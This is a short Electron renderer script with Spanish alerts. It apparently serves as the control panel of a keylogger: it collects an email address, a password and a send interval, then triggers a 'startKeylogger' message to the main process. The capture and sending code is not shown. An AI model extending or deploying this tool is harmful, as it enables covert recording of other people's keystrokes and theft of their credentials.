const {ipcRenderer} = require('electron');

let time = document.querySelector('#getTime');
let selectedTime;
time.addEventListener('change', function(){
  selectedTime = this.options[time.selectedIndex].value;
  ipcRenderer.send('sendEvery', selectedTime);
});

let start = document.querySelector('#start');
start.addEventListener('click', () => {
  let email = document.querySelector('#email').value;
  let password = document.querySelector('#password').value;
  if(!email || !password){
    alert('No ha llenado todos los campos');
  } else {
    if(selectedTime){
      ipcRenderer.send('startKeylogger', {email: email, password: password})
    } else {
      alert('Debes seleccionar el tiempo de envio');
    }
  }
});

